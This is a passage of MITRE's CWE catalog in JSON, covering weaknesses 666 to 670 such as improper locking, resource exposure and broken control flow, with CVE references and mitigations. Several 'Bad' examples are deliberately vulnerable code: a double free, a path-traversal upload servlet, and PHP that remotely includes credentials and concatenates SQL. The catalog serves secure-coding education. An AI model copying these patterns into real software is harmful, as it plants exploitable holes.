        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "DCL00-J",
          "EntryName": "Prevent class initialization cycles"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP4",
          "EntryName": "Unchecked Status Condition"
        }
      ],
      "RelatedAttackPatterns": [
        "26",
        "29"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-436",
          "Authors": [
            "mercy"
          ],
          "Title": "Exploiting Uninitialized Data",
          "PublicationYear": "2006",
          "PublicationMonth": "01",
          "URL": "http://www.felinemenace.org/~mercy/papers/UBehavior/UBehavior.zip"
        },
        {
          "ExternalReferenceID": "REF-437",
          "Authors": [
            "Microsoft Security Vulnerability Research & Defense"
          ],
          "Title": "MS08-014 : The Case of the Uninitialized Stack Variable Vulnerability",
          "PublicationYear": "2008",
          "PublicationMonth": "03",
          "PublicationDay": "11",
          "URL": "https://msrc.microsoft.com/blog/2008/03/ms08-014-the-case-of-the-uninitialized-stack-variable-vulnerability/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 7, \"Variable Initialization\", Page 312",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Discouraged",
        "Rationale": "This CWE entry is a level-1 Class (i.e., a child of a Pillar). It might have lower-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "666",
      "Name": "Operation on Resource in Wrong Phase of Lifetime",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product performs an operation on a resource at the wrong phase of the resource's lifecycle, which can lead to unexpected behaviors.",
      "ExtendedDescription": "A resource's lifecycle includes several phases: initialization, use, and release. For each phase, it is important to follow the specifications outlined for how to operate on the resource and to ensure that the resource is in the expected phase. Otherwise, if a resource is in one phase but the operation is not valid for that phase (i.e., an incorrect phase of the resource's lifetime), then this can produce resultant weaknesses. For example, using a resource before it has been fully initialized could cause corruption or incorrect data to be used.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "664",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Other"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Follow the resource's lifecycle from creation to release."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-149",
          "Entries": [
            {
              "IntroText": "The following code shows a simple example of a double free vulnerability."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\t char* ptr = (char*)malloc (SIZE);\n\t ...\n\t if (abrt) { \n\t\t free(ptr); \n\t }\n\t ...\n\t free(ptr); \n```"
            },
            {
              "BodyText": "Double free vulnerabilities have two common (and sometimes overlapping) causes:"
            },
            {
              "BodyText": "- Error conditions and other exceptional circumstances\n\n  - Confusion over which part of the program is responsible for freeing the memory"
            },
            {
              "BodyText": "Although some double free vulnerabilities are not much more complicated than this example, most are spread out across hundreds of lines of code or even different files. Programmers seem particularly susceptible to freeing global variables more than once."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2006-5051",
          "Description": "Chain: Signal handler contains too much functionality (CWE-828), introducing a race condition (CWE-362) that leads to a double free (CWE-415).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-5051"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "FIO46-C",
          "EntryName": "Do not access a closed file",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "MEM30-C",
          "EntryName": "Do not access freed memory",
          "MappingFit": "CWE More Abstract"
        }
      ],
      "MappingNotes": {
        "Usage": "Discouraged",
        "Rationale": "This CWE entry is a level-1 Class (i.e., a child of a Pillar). It might have lower-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "667",
      "Name": "Improper Locking",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product does not properly acquire or release a lock on a resource, leading to unexpected resource state changes and behaviors.",
      "ExtendedDescription": "\n\nLocking is a type of synchronization behavior that ensures that multiple independently-operating processes or threads do not interfere with each other when accessing the same resource. All processes/threads are expected to follow the same steps for locking. If these steps are not followed precisely - or if no locking is done at all - then another process/thread could modify the shared resource in a way that is not visible or predictable to the original process. This can lead to data or memory corruption, denial of service, etc.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "662",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "662",
          "ViewID": "1003",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "662",
          "ViewID": "1305",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "662",
          "ViewID": "1340",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Resource Consumption (CPU)"
          ],
          "Note": "Inconsistent locking discipline can lead to deadlock."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Strategy": "Libraries or Frameworks",
          "Description": "Use industry standard APIs to implement locking mechanism."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In the following Java snippet, methods are defined to get and set a long field in an instance of a class that is shared across multiple threads. Because operations on double and long are nonatomic in Java, concurrent access may cause unexpected behavior. Thus, all operations on long and double fields should be synchronized."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tprivate long someLongValue;\n\tpublic long getLongValue() {\n\t\treturn someLongValue;\n\t}\n\tpublic void setLongValue(long l) {\n\t\tsomeLongValue = l;\n\t}\n```"
            }
          ]
        },
        {
          "ID": "DX-69",
          "Entries": [
            {
              "IntroText": "This code tries to obtain a lock for a file, then writes to it."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\tfunction writeToLog($message){\n\t\t$logfile = fopen(\"logFile.log\", \"a\");\n```\n//attempt to get logfile lock* \n\t\tif (flock($logfile, LOCK_EX)) {\n\t\t```\n\t\t\tfwrite($logfile,$message);\n```\n// unlock logfile* \n\t\t\tflock($logfile, LOCK_UN);}\n\t\telse {\n\t\t```\n\t\t\tprint \"Could not obtain lock on logFile.log, message not recorded\\n\";\n\t\t}\n\t}\n\tfclose($logFile);\n```"
            },
            {
              "BodyText": "PHP by default will wait indefinitely until a file lock is released. If an attacker is able to obtain the file lock, this code will pause execution, possibly leading to denial of service for other users. Note that in this case, if an attacker can perform an flock() on the file, they may already have privileges to destroy the log file. However, this still impacts the execution of other programs that depend on flock()."
            }
          ]
        },
        {
          "ID": "DX-24",
          "Entries": [
            {
              "IntroText": "The following function attempts to acquire a lock in order to perform operations on a shared resource."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tvoid f(pthread_mutex_t *mutex) {\n\t\t\tpthread_mutex_lock(mutex);\n```\n/* access shared resource */* \n\t\t\t\n\t\t\t\n\t\t\tpthread_mutex_unlock(mutex);}"
            },
            {
              "BodyText": "However, the code does not check the value returned by pthread_mutex_lock() for errors. If pthread_mutex_lock() cannot acquire the mutex for any reason, the function may introduce a race condition into the program and result in undefined behavior."
            },
            {
              "BodyText": "In order to avoid data races, correctly written programs must check the result of thread synchronization functions and appropriately handle all errors, either by attempting to recover from them or reporting them to higher levels."
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "```\n\tint f(pthread_mutex_t *mutex) {\n\t\t\tint result;\n\t\t\tresult = pthread_mutex_lock(mutex);\n\t\t\tif (0 != result)\n\t\t\t\treturn result;\n```\n/* access shared resource */* \n\t\t\t\n\t\t\t\n\t\t\treturn pthread_mutex_unlock(mutex);}"
            }
          ]
        },
        {
          "ID": "DX-70",
          "Entries": [
            {
              "IntroText": "It may seem that the following bit of code achieves thread safety while avoiding unnecessary synchronization..."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tif (helper == null) {\n\t\t\tsynchronized (this) {\n\t\t\t\tif (helper == null) {\n\t\t\t\t\thelper = new Helper();\n\t\t\t\t}\n\t\t\t}\n\t}\n\treturn helper;\n```"
            },
            {
              "BodyText": "The programmer wants to guarantee that only one Helper() object is ever allocated, but does not want to pay the cost of synchronization every time this code is called."
            },
            {
              "BodyText": "Suppose that helper is not initialized. Then, thread A sees that helper==null and enters the synchronized block and begins to execute:"
            },
            {
              "Nature": "Bad",
              "ExampleCode": "```\n\thelper = new Helper();\n```"
            },
            {
              "BodyText": "If a second thread, thread B, takes over in the middle of this call and helper has not finished running the constructor, then thread B may make calls on helper while its fields hold incorrect values."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2021-1782",
          "Description": "Chain: improper locking (CWE-667) leads to race condition (CWE-362), as exploited in the wild per CISA KEV.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2021-1782"
        },
        {
          "Reference": "CVE-2009-0935",
          "Description": "Attacker provides invalid address to a memory-reading function, causing a mutex to be unlocked twice",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0935"
        },
        {
          "Reference": "CVE-2010-4210",
          "Description": "function in OS kernel unlocks a mutex that was not previously locked, causing a panic or overwrite of arbitrary memory.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-4210"
        },
        {
          "Reference": "CVE-2008-4302",
          "Description": "Chain: OS kernel does not properly handle a failure of a function call (CWE-755), leading to an unlock of a resource that was not locked (CWE-832), with resultant crash.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4302"
        },
        {
          "Reference": "CVE-2009-1243",
          "Description": "OS kernel performs an unlock in some incorrect circumstances, leading to panic.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1243"
        },
        {
          "Reference": "CVE-2009-2857",
          "Description": "OS deadlock",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2857"
        },
        {
          "Reference": "CVE-2009-1961",
          "Description": "OS deadlock involving 3 separate functions",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1961"
        },
        {
          "Reference": "CVE-2009-2699",
          "Description": "deadlock in library",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2699"
        },
        {
          "Reference": "CVE-2009-4272",
          "Description": "deadlock triggered by packets that force collisions in a routing table",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-4272"
        },
        {
          "Reference": "CVE-2002-1850",
          "Description": "read/write deadlock between web server and script",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1850"
        },
        {
          "Reference": "CVE-2004-0174",
          "Description": "web server deadlock involving multiple listening connections",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0174"
        },
        {
          "Reference": "CVE-2009-1388",
          "Description": "multiple simultaneous calls to the same function trigger deadlock.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1388"
        },
        {
          "Reference": "CVE-2006-5158",
          "Description": "chain: other weakness leads to NULL pointer dereference (CWE-476) or deadlock (CWE-833).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-5158"
        },
        {
          "Reference": "CVE-2006-4342",
          "Description": "deadlock when an operation is performed on a resource while it is being removed.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4342"
        },
        {
          "Reference": "CVE-2006-2374",
          "Description": "Deadlock in device driver triggered by using file handle of a related device.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-2374"
        },
        {
          "Reference": "CVE-2006-2275",
          "Description": "Deadlock when large number of small messages cannot be processed quickly enough.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-2275"
        },
        {
          "Reference": "CVE-2005-3847",
          "Description": "OS kernel has deadlock triggered by a signal during a core dump.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3847"
        },
        {
          "Reference": "CVE-2005-3106",
          "Description": "Race condition leads to deadlock.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3106"
        },
        {
          "Reference": "CVE-2005-2456",
          "Description": "Chain: array index error (CWE-129) leads to deadlock (CWE-833)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2456"
        },
        {
          "Reference": "CVE-2001-0682",
          "Description": "Program can not execute when attacker obtains a mutex.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2001-0682"
        },
        {
          "Reference": "CVE-2002-1914",
          "Description": "Program can not execute when attacker obtains a lock on a critical output file.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1914"
        },
        {
          "Reference": "CVE-2002-1915",
          "Description": "Program can not execute when attacker obtains a lock on a critical output file.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1915"
        },
        {
          "Reference": "CVE-2002-0051",
          "Description": "Critical file can be opened with exclusive read access by user, preventing application of security policy. Possibly related to improper permissions, large-window race condition.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0051"
        },
        {
          "Reference": "CVE-2000-0338",
          "Description": "Chain: predictable file names used for locking, allowing attacker to create the lock beforehand. Resultant from permissions and randomness.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0338"
        },
        {
          "Reference": "CVE-2000-1198",
          "Description": "Chain: Lock files with predictable names. Resultant from randomness.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2000-1198"
        },
        {
          "Reference": "CVE-2002-1869",
          "Description": "Product does not check if it can write to a log file, allowing attackers to avoid logging by accessing the file using an exclusive lock. Overlaps unchecked error condition. This is not quite CWE-412, but close.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1869"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "CON31-C",
          "EntryName": "Do not destroy a mutex while it is locked",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "POS48-C",
          "EntryName": "Do not unlock or destroy another POSIX thread's mutex",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "VNA00-J",
          "EntryName": "Ensure visibility when accessing shared primitive variables"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "VNA02-J",
          "EntryName": "Ensure that compound operations on shared variables are atomic"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "VNA05-J",
          "EntryName": "Ensure atomicity when reading and writing 64-bit values"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "LCK06-J",
          "EntryName": "Do not use an instance lock to protect shared static data"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP19",
          "EntryName": "Missing Lock"
        },
        {
          "TaxonomyName": "OMG ASCSM",
          "EntryID": "ASCSM-CWE-667"
        }
      ],
      "RelatedAttackPatterns": [
        "25",
        "26",
        "27"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-962",
          "Section": "ASCSM-CWE-667",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Security Measure (ASCSM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCSM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "Deeper research is necessary for synchronization and related mechanisms, including locks, mutexes, semaphores, and other mechanisms. Multiple entries are dependent on this research, which includes relationships to concurrency, race conditions, reentrant functions, etc. CWE-662 and its children - including CWE-667, CWE-820, CWE-821, and others - may need to be modified significantly, along with their relationships."
        }
      ]
    },
    {
      "ID": "668",
      "Name": "Exposure of Resource to Wrong Sphere",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product exposes a resource to the wrong control sphere, providing unintended actors with inappropriate access to the resource.",
      "ExtendedDescription": "\n\nResources such as files and directories may be inadvertently exposed through mechanisms such as insecure permissions, or when a program accidentally operates on the wrong object. For example, a program may intend that private files can only be provided to a specific user. This effectively defines a control sphere that is intended to prevent attackers from accessing these private files. If the file permissions are insecure, then parties other than the user will be able to access those files.\n\n\nA separate control sphere might effectively require that the user can only access the private files, but not any other files on the system. If the program does not ensure that the user is only requesting private files, then the user might be able to access other files on the system.\n\n\nIn either case, the end result is that a resource has been exposed to the wrong party.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "664",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Other"
          ],
          "Impact": [
            "Read Application Data",
            "Modify Application Data",
            "Other"
          ]
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-1287",
          "Section": "Details of Problematic Mappings",
          "Authors": [
            "MITRE"
          ],
          "Title": "Supplemental Details - 2022 CWE Top 25",
          "PublicationYear": "2022",
          "PublicationMonth": "06",
          "PublicationDay": "28",
          "URL": "https://cwe.mitre.org/top25/archive/2022/2022_cwe_top25_supplemental.html#problematicMappingDetails"
        }
      ],
      "MappingNotes": {
        "Usage": "Discouraged",
        "Rationale": "CWE-668 is high-level and is often misused as a catch-all when lower-level CWE IDs might be applicable. It is sometimes used for low-information vulnerability reports [REF-1287]. It is a level-1 Class (i.e., a child of a Pillar). It is not useful for trend analysis.",
        "Comments": "Closely analyze the specific mistake that is allowing the resource to be exposed, and perform a CWE mapping for that mistake.",
        "Reasons": [
          "Frequent Misuse",
          "Abstraction"
        ]
      },
      "Notes": [
        {
          "Type": "Theoretical",
          "Note": "A \"control sphere\" is a set of resources and behaviors that are accessible to a single actor, or a group of actors. A product's security model will typically define multiple spheres, possibly implicitly. For example, a server might define one sphere for \"administrators\" who can create new user accounts with subdirectories under /home/server/, and a second sphere might cover the set of users who can create or delete files within their own subdirectories. A third sphere might be \"users who are authenticated to the operating system on which the product is installed.\" Each sphere has different sets of actors and allowable behaviors."
        }
      ]
    },
    {
      "ID": "669",
      "Name": "Incorrect Resource Transfer Between Spheres",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product does not properly transfer a resource/behavior to another sphere, or improperly imports a resource/behavior from another sphere, in a manner that provides unintended control over that resource.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "664",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "BackgroundDetails": [
        "A \"control sphere\" is a set of resources and behaviors that are accessible to a single actor, or a group of actors. A product's security model will typically define multiple spheres, possibly implicitly. For example, a server might define one sphere for \"administrators\" who can create new user accounts with subdirectories under /home/server/, and a second sphere might cover the set of users who can create or delete files within their own subdirectories. A third sphere might be \"users who are authenticated to the operating system on which the product is installed.\" Each sphere has different sets of actors and allowable behaviors."
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity"
          ],
          "Impact": [
            "Read Application Data",
            "Modify Application Data",
            "Unexpected State"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-22",
          "Entries": [
            {
              "IntroText": "The following code demonstrates the unrestricted upload of a file with a Java servlet and a path traversal vulnerability. The action attribute of an HTML form is sending the upload file request to the Java servlet."
            },
            {
              "Nature": "Good",
              "Language": "HTML",
              "ExampleCode": "```\n\t<form action=\"FileUploadServlet\" method=\"post\" enctype=\"multipart/form-data\">\n\tChoose a file to upload:\n\t<input type=\"file\" name=\"filename\"/>\n\t<br/>\n\t<input type=\"submit\" name=\"submit\" value=\"Submit\"/>\n\t</form>\n```"
            },
            {
              "BodyText": "When submitted the Java servlet's doPost method will receive the request, extract the name of the file from the Http request header, read the file contents from the request and output the file to the local upload directory."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class FileUploadServlet extends HttpServlet {\n\t\t\t...\n\t\t\tprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n\t\t\t\t\tresponse.setContentType(\"text/html\");\n\t\t\t\t\tPrintWriter out = response.getWriter();\n\t\t\t\t\tString contentType = request.getContentType();\n\t\t\t\t\t// the starting position of the boundary header\n\t\t\t\t\tint ind = contentType.indexOf(\"boundary=\");\n\t\t\t\t\tString boundary = contentType.substring(ind+9);\n\t\t\t\t\tString pLine = new String();\n\t\t\t\t\tString uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value\n\t\t\t\t\t// verify that content type is multipart form data\n\t\t\t\t\tif (contentType != null && contentType.indexOf(\"multipart/form-data\") != -1) {\n\t\t\t\t\t\t\t// extract the filename from the Http header\n\t\t\t\t\t\t\tBufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));\n\t\t\t\t\t\t\t...\n\t\t\t\t\t\t\tpLine = br.readLine();\n\t\t\t\t\t\t\tString filename = pLine.substring(pLine.lastIndexOf(\"\\\\\"), pLine.lastIndexOf(\"\\\"\"));\n\t\t\t\t\t\t\t...\n\t\t\t\t\t\t\t// output the file to the local upload directory\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\t\tBufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));\n\t\t\t\t\t\t\t\t\tfor (String line; (line=br.readLine())!=null; ) {\n\t\t\t\t\t\t\t\t\t\tif (line.indexOf(boundary) == -1) {\n\t\t\t\t\t\t\t\t\t\t\tbw.write(line);\n\t\t\t\t\t\t\t\t\t\t\tbw.newLine();\n\t\t\t\t\t\t\t\t\t\t\tbw.flush();\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t} //end of for loop\n\t\t\t\t\t\t\t\t\tbw.close();\n\t\t\t\t\t\t\t} catch (IOException ex) {...}\n\t\t\t\t\t\t\t// output successful upload response HTML page\n\t\t\t\t\t}\n\t\t\t\t\t// output unsuccessful upload response HTML page\n\t\t\t\t\telse\n\t\t\t\t\t{...}\n\t\t\t}\n\t\t\t\t...\n\t}\n```"
            },
            {
              "BodyText": "This code does not perform a check on the type of the file being uploaded (CWE-434). This could allow an attacker to upload any executable file or other file with malicious code."
            },
            {
              "BodyText": "Additionally, the creation of the BufferedWriter object is subject to relative path traversal (CWE-23). Since the code does not check the filename that is provided in the header, an attacker can use \"../\" sequences to write to files outside of the intended directory. Depending on the executing environment, the attacker may be able to specify arbitrary files to write to, leading to a wide variety of consequences, from code execution, XSS (CWE-79), or system crash."
            }
          ]
        },
        {
          "ID": "DX-219",
          "Entries": [
            {
              "IntroText": "This code includes an external script to get database credentials, then authenticates a user against the database, allowing access to the application."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n```\n//assume the password is already encrypted, avoiding CWE-312* \n\t\n\tfunction authenticate($username,$password){\n\t```\n\t\tinclude(\"http://external.example.com/dbInfo.php\");\n```\n//dbInfo.php makes $dbhost, $dbuser, $dbpass, $dbname available* \n\t\tmysql_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to mysql');\n\t\tmysql_select_db($dbname);\n\t\t$query = 'Select * from users where username='.$username.' And password='.$password;\n\t\t$result = mysql_query($query);\n\t\t\n\t\tif(mysql_numrows($result) == 1){\n\t\t```\n\t\t\tmysql_close();\n\t\t\treturn true;\n\t\t}\n\t\telse{\n\t\t\tmysql_close();\n\t\t\treturn false;\n\t\t}\n\t}\n```"
            },
            {
              "BodyText": "This code does not verify that the external domain accessed is the intended one. An attacker may somehow cause the external domain name to resolve to an attack server, which would provide the information for a false database. The attacker may then steal the usernames and encrypted passwords from real user login attempts, or simply allow themself to access the application without a real user account."
            },
            {
              "BodyText": "This example is also vulnerable to an Adversary-in-the-Middle AITM (CWE-300) attack."
            }
          ]
        },
        {
          "ID": "DX-220",
          "Entries": [
            {
              "IntroText": "This code either generates a public HTML user information page or a JSON response containing the same user information."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n```\n// API flag, output JSON if set* \n\t$json = $_GET['json']\n\t$username = $_GET['user']\n\tif(!$json)\n\t{\n\t```\n\t\t\t$record = getUserRecord($username);\n\t\t\tforeach($record as $fieldName => $fieldValue)\n\t\t\t{\n\t\t\t\t\tif($fieldName == \"email_address\") {\n```\n// skip displaying user emails* \n\t\t\t\t\t\t\tcontinue;}\n\t\t\t\t\telse{\n\t\t\t\t\t```\n\t\t\t\t\t\twriteToHtmlPage($fieldName,$fieldValue);\n\t\t\t\t\t}\n\t\t\t}\n\t}\n\telse\n\t{\n\t\t$record = getUserRecord($username);\n\t\techo json_encode($record);\n\t}\n```"
            },
            {
              "BodyText": "The programmer is careful to not display the user's e-mail address when displaying the public HTML page. However, the e-mail address is not removed from the JSON response, exposing the user's e-mail address."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2021-22909",
          "Description": "Chain: router's firmware update procedure uses curl with \"-k\" (insecure) option that disables certificate validation (CWE-295), allowing adversary-in-the-middle (AITM) compromise with a malicious firmware image (CWE-494).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2021-22909"
        },
        {
          "Reference": "CVE-2023-5227",
          "Description": "PHP-based FAQ management app does not check the MIME type for uploaded images",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2023-5227"
        },
        {
          "Reference": "CVE-2005-0406",
          "Description": "Some image editors modify a JPEG image, but the original EXIF thumbnail image is left intact within the JPEG. (Also an interaction error).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-0406"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "670",
      "Name": "Always-Incorrect Control Flow Implementation",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The code contains a control flow path that does not reflect the algorithm that the path is intended to implement, leading to incorrect behavior any time this path is navigated.",
      "ExtendedDescription": "This weakness captures cases in which a particular code segment is always incorrect with respect to the algorithm that it is implementing. For example, if a C programmer intends to include multiple statements in a single block but does not include the enclosing braces (CWE-483), then the logic is always incorrect. This issue is in contrast to most weaknesses in which the code usually behaves correctly, except when it is externally manipulated in malicious ways.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "691",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "This issue typically appears in rarely-tested code, since the \"always-incorrect\" nature will be detected as a bug during normal usage."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Other",
            "Alter Execution Logic"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-180",
          "Entries": [
            {
              "IntroText": "This code queries a server and displays its status when a request comes from an authorized IP address."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\t$requestingIP = $_SERVER['REMOTE_ADDR'];\n\tif(!in_array($requestingIP,$ipAllowList)){\n\t\techo \"You are not authorized to view this page\";\n\t\thttp_redirect($errorPageURL);\n\t}\n\t$status = getServerStatus();\n\techo $status;\n```\n...*"
            },
            {
              "BodyText": "This code redirects unauthorized users, but continues to execute code after calling http_redirect(). This means even unauthorized users may be able to access the contents of the page or perform a DoS attack on the server being queried. Also, note that this code is vulnerable to an IP address spoofing attack (CWE-212)."
            }
          ]
        },
        {
          "ID": "DX-181",
          "Entries": [
            {
              "IntroText": "In this example, the programmer has indented the statements to call Do_X() and Do_Y(), as if the intention is that these functions are only called when the condition is true. However, because there are no braces to signify the block, Do_Y() will always be executed, even if the condition is false."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tif (condition==true)\n\t\tDo_X();\n\t\tDo_Y();\n```"
            },
            {
              "BodyText": "This might not be what the programmer intended. When the condition is critical for security, such as in making a security decision or detecting a critical error, this may produce a vulnerability."
            }
